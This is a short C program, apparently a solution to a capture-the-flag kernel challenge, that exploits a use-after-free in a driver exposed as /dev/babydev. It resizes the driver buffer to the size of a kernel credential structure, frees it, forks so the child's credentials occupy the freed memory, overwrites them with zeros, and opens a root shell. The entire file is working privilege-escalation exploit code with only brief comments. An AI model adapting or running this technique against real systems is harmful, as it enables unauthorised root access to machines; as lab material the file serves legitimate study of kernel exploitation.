#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main(){
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);
	
	//mem size to 0xa8 equal to cred
	ioctl(fd1, 0x10001, 0xa8);
	
	//uaf
	close(fd1);
	
	int pid = fork();
	if(pid < 0){
		printf("fork failed");
		return -1;
	}
	
	if(pid == 0){
		//children process
		char zeros[30] = { 0 };
		write(fd2, zeros, 28);
		
		if(getuid() == 0){
			system("/bin/sh");
			exit(0);
		}
	}else{
		//main process
		wait(0);
	}
	
	close(fd2);
	return 0;
}
